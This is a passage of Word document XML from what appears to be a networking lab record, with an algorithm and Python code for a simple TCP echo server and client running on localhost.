        <w:t>Class-based method is an intuitive approach which doesn't need an instance of a</w:t>
      </w:r>
      <w:r w:rsidR="004967CD" w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>socket object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46AC27C8" w14:textId="120060F2" w:rsidR="004967CD" w:rsidRPr="005B6C3A" w:rsidRDefault="00000000" w:rsidP="005B6C3A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>For example, in order to print a machine's IP address, you don't need a socket</w:t>
      </w:r>
      <w:r w:rsidR="004967CD" w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>object. Instead, just call the socket's class-based methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBD75A4" w14:textId="3393E6FA" w:rsidR="004967CD" w:rsidRPr="005B6C3A" w:rsidRDefault="00000000" w:rsidP="005B6C3A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>In instance-based method, if some data needed to be sent to a server application</w:t>
      </w:r>
      <w:r w:rsidR="004967CD" w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79FDB00F" w14:textId="4C10CE1A" w:rsidR="004967CD" w:rsidRPr="005B6C3A" w:rsidRDefault="004967CD" w:rsidP="005B6C3A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>It is more intuitive to create a socket object to perform that explicit operation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2220C2B8" w14:textId="3BBF87A6" w:rsidR="0094061E" w:rsidRPr="005B6C3A" w:rsidRDefault="00000000" w:rsidP="005B6C3A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>This module has everything you need to build socket servers and clients.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDAE3AF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="37789C16" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="315D9E6C" w14:textId="3E6157F8" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>TCP Client-Server Communication Using Socket programming in python:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9353A6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FCECE9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1965CF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Create a TCP socket using `socket.socket(AF_INET, SOCK_STREAM)`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6394C2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Bind the socket to `'localhost'` and a specific port using `bind()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434ED029" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Listen for incoming client connections using `listen()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41948E22" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Accept a connection, receive the client’s message using `recv()`, and send a reply using `send()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1D9500" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Ask the user whether to continue; if not, close the socket using `close()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38EA1B5C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082863BB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Create a TCP socket using `socket.socket(AF_INET, SOCK_STREAM)`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10869F1B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Connect the socket to the server using `connect((‘localhost’, 55555))`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17927BB2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Send a message to the server using `send()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A00792" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Receive the reply from the server using `recv()` and display it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4F56D0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Close the socket connection using `close()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9D1309" w14:textId="77777777" w:rsidR="00D97D3B" w:rsidRDefault="00000000" w:rsidP="007A01D0">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="446EA9A1" w14:textId="77777777" w:rsidR="00D97D3B" w:rsidRDefault="00D97D3B" w:rsidP="007A01D0">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FB202D3" w14:textId="70F00EA4" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="007A01D0">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B232EE4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FCAE3A8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758C5D33" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>sockfd=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E05E12" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>print('Socket Created')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E85ABC9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>sockfd.bind(('localhost',55555))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791C104A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>sockfd.listen(3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A9D1A8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>print('Waiting for connections')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DCEDBA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5398CE4A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    clientfd,addr=sockfd.accept()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282EBEEE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    receivedMsg=clientfd.recv(1024).decode()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245F8655" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("Connected with ",addr)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB1247F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("Message Received from Client: ",receivedMsg)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D21020" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    clientfd.send(bytes(receivedMsg,'utf-8'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC17C5C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("Message reply sent to Client!")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BCC9C02" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("Do you want to continue(type y or n):")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4389B040" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    choice=input()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143B5195" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    if choice=='n':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B57BCC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="475B2391" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E703F14" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0330AE19" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>clientfd=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D93A1A9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>clientfd.connect(('localhost',55555))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23ADD386" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>name=input("Enter your message:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E988149" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>clientfd.send(bytes(name,'utf-8'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA4C3E9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>print("Message Received from Server: ",clientfd.recv(1024).decode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AFC74D3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="58070485" w14:textId="77777777" w:rsidR="00D97D3B" w:rsidRDefault="00D97D3B" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="621A7873" w14:textId="588095FE" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8BBDA7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F77C66" w14:textId="54D21132" w:rsidR="0094061E" w:rsidRDefault="00D348E0" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00D348E0">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="19EA9B7C" wp14:editId="585BA23C">
            <wp:extent cx="5731510" cy="2304415"/>
            <wp:effectExtent l="0" t="0" r="2540" b="635"/>
            <wp:docPr id="1552320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320504" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId26"/>
                    <a:stretch>
